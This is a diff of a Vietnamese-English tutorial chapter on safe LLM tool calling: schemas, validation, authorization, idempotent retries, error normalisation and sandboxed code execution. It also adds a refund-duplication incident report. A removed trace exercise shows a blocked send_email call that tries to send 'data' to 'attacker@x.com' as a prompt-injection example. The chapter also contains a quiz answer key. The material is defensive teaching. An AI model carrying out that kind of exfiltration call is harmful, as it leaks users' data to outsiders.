@@ -1,73 +1,62 @@
 Function Calling / Tool Use là contract boundary giữa **probabilistic language generation** và **deterministic software execution**. Model có thể đề xuất action, nhưng hệ thống của bạn mới quyết định action đó có parse được không, hợp schema không, user có quyền không, có an toàn không, có idempotent không, có timeout không, và observation trả lại model như thế nào.
 
-## Why this matters
+---
 
-Tool use fail có thể gây hậu quả thật:
+## 1. The Incident (Tình huống sự cố)
 
-- model hallucinate tool name,
-- JSON arguments sai type,
-- gọi tool user không có quyền,
-- retry tạo duplicate side effects,
-- tool timeout làm agent loop,
-- tool output chứa prompt injection,
-- code interpreter leak secrets,
-- model gọi parallel tools không độc lập.
+<Callout type="danger" title="Báo cáo sự cố: Agent retry tạo 12 refund trùng lặp vì không có idempotency key">
+**Bối cảnh:** Một team build "customer support agent" có thể issue refund. Architecture ban đầu rất đơn giản: model gọi tool `create_refund(order_id, amount_cents)`, runtime execute, trả kết quả.
 
-<Callout type="warning" title="The model proposes; your system disposes">
-Tool call từ model không phải permission để execute. Runtime phải parse, validate, authorize, budget-check, execute và log trước khi observation quay lại model.
+**Sự cố:** Một user request refund. Model gọi tool `create_refund`. Tool timeout sau 5 giây. Runtime retry tự động. Tool timeout lần nữa. Runtime retry lần 3. Tool timeout lần 3. Lần 4, tool thành công — nhưng thực tế 3 lần trước cũng đã tạo refund, chỉ là response chậm.
+
+1. Không có idempotency key — mỗi retry tạo refund mới.
+2. Tool `create_refund` có side effect (financial) nhưng không có idempotency key.
+3. Retry không có idempotency awareness — retry mù quáng.
+4. Không có human approval cho financial action.
+5. Không có audit log để phát hiện trùng lặp.
+
+**Hậu quả:** 12 refund trùng lặp cho 1 order, user nhận thừa tiền, và team phải tắt tính năng refund để thiết kế lại idempotency, approval và audit.
 </Callout>
 
-## Learning objectives
+Bài học rút ra: tool call từ model không phải permission để execute. Side-effect tools cần idempotency key và/hoặc human approval. Retry mù quáng có thể tạo duplicate actions. Mỗi arrow trong lifecycle có thể fail, và production tool use phải handle từng failure.
 
-Sau chương này, bạn sẽ có thể:
+---
 
-1. Giải thích function calling như action proposal mechanism.
-2. Thiết kế JSON schemas robust cho tools.
-3. Parse, validate và normalize tool calls.
-4. Implement execute → observe → continue lifecycle.
-5. Xử lý parallel tool calls an toàn.
-6. So sánh OpenAI/Anthropic tool-use formats ở mức conceptual.
-7. Thiết kế structured error contracts.
-8. Enforce authorization per tool/action.
-9. Thiết kế sandboxed code execution.
-10. Đánh giá tool-use reliability bằng metrics.
-
-## Prerequisites
-
-Bạn nên biết:
-
-- Agent components: tool registry, executor, guardrails.
-- JSON schema và validation.
-- API timeouts/retries.
-- Secure API principles.
-
-## Core intuition: tool calls are proposed actions
-
-Lifecycle:
+## 2. Architecture Blueprint (Tool Call Lifecycle)
 
 ```text
-User request
-  ↓
-Model receives tool schemas
-  ↓
-Model emits tool call
-  ↓
-Parse tool call
-  ↓
-Validate schema
-  ↓
-Authorize action
-  ↓
-Execute tool
-  ↓
-Return observation to model
-  ↓
-Model continues or finalizes
+[ User request ]
+        │
+        ▼
+[ Model receives tool schemas ]
+        │
+        ▼
+[ Model emits tool call ]   ← proposed action
+        │
+        ▼
+[ Parse tool call ]
+        │
+        ▼
+[ Validate schema ]
+        │
+        ▼
+[ Authorize action ]   ← permission, not model
+        │
+        ▼
+[ Execute tool ]
+        │
+        ▼
+[ Return observation to model ]
+        │
+        ▼
+[ Model continues or finalizes ]
 ```
 
-Mỗi arrow có thể fail. Production tool use phải handle từng failure.
+Mỗi arrow có thể fail. Production tool use phải handle từng failure. The model proposes; your system disposes.
 
-## Tool schema design
+---
+
+## 3. Tool Schema Design
 
 Tool schema tốt giúp model chọn đúng và giúp runtime validate chắc.
 
@@ -99,7 +88,13 @@ Example:
 }
 ```
 
-## Bad vs good schemas
+<Callout type="warning" title="Tool description là part of policy">
+Model chọn tool dựa vào name/description/schema. Tool description mơ hồ là nguyên nhân phổ biến của wrong tool selection. Generic tools như `do_task` hoặc `run_sql` làm model khó chọn đúng và runtime khó validate an toàn.
+</Callout>
+
+---
+
+## 4. Bad vs Good Schemas
 
 | Bad schema | Problem | Better |
 |---|---|---|
@@ -109,7 +104,11 @@ Example:
 | `execute_sql(query)` | injection/destructive | parameterized query tools |
 | `run_shell(command)` | arbitrary execution | constrained sandbox API |
 
-## Provider formats vs internal contract
+Schema tốt là schema khiến model khó chọn sai và runtime dễ validate. Đừng dùng generic tools — bạn mất control.
+
+---
+
+## 5. Provider Formats vs Internal Contract
 
 Providers expose different formats. App nên normalize chúng.
 
@@ -137,7 +136,7 @@ Internal tool result contract:
 }
 ```
 
-## OpenAI-style flow
+OpenAI-style flow:
 
 ```text
 messages + tools schema → model response with tool_calls
@@ -146,7 +145,7 @@ app sends tool results as messages
 model returns final answer or more tool calls
 ```
 
-## Anthropic-style flow
+Anthropic-style flow:
 
 ```text
 messages + tools → assistant emits tool_use block
@@ -154,9 +153,11 @@ app returns tool_result block
 model continues
 ```
 
-Differences matter cho adapter, nhưng internal lifecycle vẫn giống nhau.
+Differences matter cho adapter, nhưng internal lifecycle vẫn giống nhau. Normalized contract giúp provider-agnostic app, dễ thêm fallback, logging và tests.
 
-## Parallel tool calls
+---
+
+## 6. Parallel Tool Calls
 
 Parallel calls hữu ích khi độc lập:
 
@@ -182,7 +183,13 @@ parallel allowed only if:
 - timeout budget enforced
 ```
 
-## Validation layers
+Parallel calls chỉ cho read-only/idempotent. Nếu write operations có thứ tự, chạy tuần tự.
+
+---
+
+## 7. Validation Layers
+
+Validation không chỉ là schema check. Có nhiều layer:
 
 1. JSON parse.
 2. Tool tồn tại trong registry.
@@ -213,10 +220,12 @@ def validate_tool_call(call, registry, user, tenant_policy):
 ```
 
 <Callout type="danger" title="Schema-valid không có nghĩa authorized">
-Tool args có thể đúng JSON/schema nhưng user vẫn không có quyền. Authorization là layer riêng, không được giao cho model.
+Tool args có thể đúng JSON/schema nhưng user vẫn không có quyền. Authorization là layer riêng, không được giao cho model. Model chỉ đề xuất action; runtime quyết định execute hay không.
 </Callout>
 
-## Structured tool errors
+---
+
+## 8. Structured Tool Errors
 
 Tool error nên safe và structured:
 
@@ -238,7 +247,11 @@ Không expose:
 - raw SQL errors,
 - private data.
 
-## Timeouts and retries
+Stack traces, SQL errors hoặc internal URLs có thể leak sensitive information. Normalize errors trước khi đưa về model.
+
+---
+
+## 9. Timeouts, Retries và Authorization
 
 Tool timeout layers:
 
@@ -247,7 +260,7 @@ Tool timeout layers:
 - retry budget,
 - circuit breaker.
 
-Retry chỉ khi operation safe/idempotent.
+Retry chỉ khi operation safe/idempotent:
 
 ```text
 calculator timeout → retry okay
@@ -256,9 +269,7 @@ send_email timeout → retry only with idempotency key
 create_refund timeout → do not blindly retry
 ```
 
-## Authorization per tool
-
-Authorization examples:
+Authorization per tool/action:
 
 ```text
 User can read invoices → invoice_search allowed
@@ -275,11 +286,11 @@ Permission cần xét:
 - action risk,
 - argument values.
 
-## Sandboxed code execution
+---
 
-Code execution là high risk.
+## 10. Sandboxed Code Execution
 
-Controls:
+Code execution là high risk. Controls:
 
 - container/process isolation,
 - no network by default,
@@ -300,7 +311,11 @@ Controls:
 | Dangerous imports | allowlist/blocklist |
 | Huge output | output cap |
 
-## Tool-use evaluation metrics
+Code interpreter không phải là một shell. Nếu agent có thể chạy code, nó phải chạy trong sandbox cô lập.
+
+---
+
+## 11. Tool-Use Evaluation Metrics
 
 | Metric | Meaning |
 |---|---|
@@ -325,7 +340,9 @@ Eval cases nên gồm:
 - parallel independent calls,
 - side-effect action requiring approval.
 
-## Implementation lab: provider-agnostic tool executor
+---
+
+## Implementation Playbook: Provider-Agnostic Tool Executor
 
 ```python
 from dataclasses import dataclass
@@ -376,52 +393,7 @@ class ToolExecutor:
             return ToolResult(call.tool_call_id, ok=False, error_type="tool_error", retryable=False)
 ```
 
-Lab requirements:
-
-- calculator tool,
-- search tool,
-- create ticket tool,
-- code sandbox mock,
-- unauthorized-call test,
-- timeout simulation,
-- parallel read-only call simulation,
-- trace logs.
-
-## Trace reading exercise
-
-Trace:
-
-```json
-{
-  "tool_call_id": "call_5",
-  "tool_name": "send_email",
-  "arguments": {"to": "attacker@x.com", "subject": "data", "body": "..."},
-  "status": "blocked",
-  "reason": "unauthorized_recipient"
-}
-```
-
-Diagnosis:
-
-- prompt injection hoặc user abuse,
-- runtime đã block nhờ authorization layer,
-- cần audit log và alert.
-
-## Common mistakes & debugging checklist
-
-<Callout type="warning" title="Mistake 1: tool schema quá generic">
-Generic tools như `do_task` hoặc `run_sql` làm model khó chọn đúng và runtime khó validate an toàn.
-</Callout>
-
-<Callout type="warning" title="Mistake 2: expose raw tool errors">
-Stack traces, SQL errors hoặc internal URLs có thể leak sensitive information. Normalize errors trước khi đưa về model.
-</Callout>
-
-<Callout type="danger" title="Mistake 3: execute side effects không idempotency/approval">
-Email, refund, purchase, deploy phải có idempotency key và/hoặc human approval. Retry mù quáng có thể tạo duplicate actions.
-</Callout>
-
-Checklist:
+Production checklist:
 
 1. Tools có schema rõ không?
 2. Có tách read/write tools không?
@@ -434,6 +406,45 @@ Checklist:
 9. Tool outputs có redaction không?
 10. Có eval set cho tool selection không?
 
+---
+
+## Post-Mortem & Troubleshooting (SRE/Gỡ lỗi)
+
+<Callout type="warning" title="Pitfall 1: Tool schema quá generic">
+**Triệu chứng:** Model chọn sai tool, gọi `do_task` cho mọi thứ, hoặc `run_sql` cho mọi query.
+
+**Fix:** Tool name cụ thể, description nói khi nào dùng, tách read/write tools. Generic tools làm model khó chọn đúng và runtime khó validate an toàn.
+</Callout>
+
+<Callout type="warning" title="Pitfall 2: Expose raw tool errors">
+**Triệu chứng:** Stack trace, SQL error, hoặc internal URL leak vào model context và user.
+
+**Fix:** Normalize errors trước khi đưa về model. Không expose API keys, stack traces, internal hostnames, raw SQL, private data.
+</Callout>
+
+<Callout type="danger" title="Pitfall 3: Execute side effects không idempotency/approval">
+**Triệu chứng:** Email, refund, purchase, deploy được retry mù quáng, tạo duplicate actions.
+
+**Fix:** Side-effect tools cần idempotency key và/hoặc human approval. Retry chỉ khi safe/idempotent. `create_refund` timeout → do not blindly retry.
+</Callout>
+
+---
+
+## Cost / Latency / Reliability Unit Economics
+
+| Quyết định | Lợi ích | Chi phí/rủi ro |
+|---|---|---|
+| Tool call thay vì model reasoning | deterministic, cheap | integration, timeout |
+| Parallel tool calls | latency giảm | chỉ cho read-only/idempotent |
+| Code execution | flexible, powerful | sandbox escape, cost |
+| Retry side-effect tools | resilience | duplicate actions |
+| Normalize tool errors | safe cho model | implementation overhead |
+| Tool registry with permissions | security boundary | maintenance |
+
+Tool use là nơi probabilistic gặp deterministic. Mỗi tool call có thể fail, nhưng mỗi tool call cũng có thể kiểm soát. Đừng giao control cho model.
+
+---
+
 ## Practice exercises
 
 1. Thiết kế schema cho 5 tools khác risk level.
@@ -443,6 +454,8 @@ Checklist:
 5. Tạo 10 eval cases bao gồm unauthorized/timeout/injection.
 6. Thiết kế sandbox policy cho code interpreter.
 7. Viết authorization matrix cho 5 tools và 3 roles.
+
+---
 
 ## Knowledge check
 
@@ -454,6 +467,8 @@ Checklist:
 6. Code sandbox cần controls gì?
 7. Internal normalized contract giúp gì?
 
+---
+
 ## Answer key
 
 1. Model chỉ đề xuất action; runtime quyết định execute hay không.
@@ -464,30 +479,7 @@ Checklist:
 6. Isolation, no network, resource limits, filesystem restrictions, output cap, secrets isolation.
 7. Provider-agnostic app, dễ thêm fallback, logging và tests.
 
-## Mini-project: Tool execution gateway
-
-**Task:** Build provider-agnostic tool executor cho agent.
-
-**Deliverables:**
-
-- Tool registry với 5 tools khác risk.
-- Normalized tool call/result contracts.
-- Schema + semantic validation.
-- Authorization layer.
-- Timeout/retry with idempotency awareness.
-- Parallel read-only execution.
-- Error normalization.
-- Trace logs.
-- 20 eval cases.
-
-**Success criteria:**
-
-- Invalid args blocked.
-- Unauthorized actions blocked.
-- Side-effect tools require idempotency key.
-- Parallel chỉ cho read-only.
-- Errors safe cho model.
-- Trace đầy đủ cho mỗi call.
+---
 
 ## Điểm cần nhớ
 
@@ -497,6 +489,8 @@ Checklist:
 - Tool errors phải normalized và safe.
 - Code execution cần sandbox isolation.
 - Tool-use cần eval set với failure cases.
+
+---
 
 ## Next chapter bridge
 
